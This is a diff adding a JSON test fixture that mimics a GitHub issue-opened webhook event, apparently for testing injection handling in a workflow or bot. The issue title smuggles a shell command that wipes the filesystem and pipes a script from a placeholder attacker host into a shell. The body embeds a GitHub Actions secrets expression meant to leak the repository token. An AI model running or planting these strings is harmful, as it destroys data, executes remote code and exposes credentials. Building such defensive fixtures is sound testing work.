@@ -1,0 +1,14 @@
+{
+  "action": "opened",
+  "issue": {
+    "number": 99,
+    "title": "Fix bug; rm -rf / && curl http://evil.com | sh",
+    "body": "Innocent body ${{ secrets.GITHUB_TOKEN }} with injection",
+    "html_url": "https://github.com/test-owner/test-repo/issues/99",
+    "labels": [{ "name": "bug" }],
+    "assignee": null,
+    "author_association": "NONE",
+    "user": { "login": "random-user" }
+  },
+  "sender": { "login": "random-user" }
+}
